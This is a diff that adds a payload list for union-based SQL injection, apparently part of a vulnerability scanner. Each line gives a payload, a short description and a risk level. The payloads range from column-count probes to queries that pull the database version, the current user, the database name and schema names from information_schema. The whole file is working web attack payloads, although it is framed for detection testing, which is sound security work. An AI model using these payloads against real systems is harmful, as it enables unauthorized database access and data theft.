@@ -1,0 +1,27 @@
+# Union-Based SQL Injection Detection Payloads
+# Description: Payloads that use UNION queries to detect and exploit vulnerabilities
+# Format: Payload|Description|Risk Level (Low/Medium/High)
+
+' UNION SELECT NULL-- -|Basic UNION test with NULL|Medium
+" UNION SELECT NULL-- -|Double quote UNION test|Medium
+' UNION SELECT 1-- -|UNION single column test|Medium
+" UNION SELECT 1-- -|Double quote UNION single column test|Medium
+' UNION SELECT 1,2-- -|UNION two column test|Medium
+" UNION SELECT 1,2-- -|Double quote UNION two column test|Medium
+' UNION SELECT 1,2,3-- -|UNION three column test|Medium
+" UNION SELECT 1,2,3-- -|Double quote UNION three column test|Medium
+' UNION SELECT 1,2,3,4-- -|UNION four column test|Medium
+" UNION SELECT 1,2,3,4-- -|Double quote UNION four column test|Medium
+' UNION SELECT 1,2,3,4,5-- -|UNION five column test|Medium
+" UNION SELECT 1,2,3,4,5-- -|Double quote UNION five column test|Medium
+' UNION ALL SELECT 1,2,3-- -|UNION ALL test|Medium
+" UNION ALL SELECT 1,2,3-- -|Double quote UNION ALL test|Medium
+' UNION SELECT NULL,NULL,NULL-- -|UNION NULL test|Medium
+" UNION SELECT NULL,NULL,NULL-- -|Double quote UNION NULL test|Medium
+1' UNION SELECT 1,'SQLVuler_UNION_TEST',3-- -|UNION with marker string|Medium
+1' UNION SELECT 1,@@version,3-- -|UNION with version (MySQL)|Medium
+1' UNION SELECT 1,version(),3-- -|UNION with version function (MySQL/PostgreSQL)|Medium
+1' UNION SELECT 1,user(),3-- -|UNION with user function (MySQL)|Medium
+1' UNION SELECT 1,current_user(),3-- -|UNION with current user (PostgreSQL)|Medium
+1' UNION SELECT 1,database(),3-- -|UNION with database name (MySQL)|Medium
+1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -|UNION with schema enum (MySQL)|High
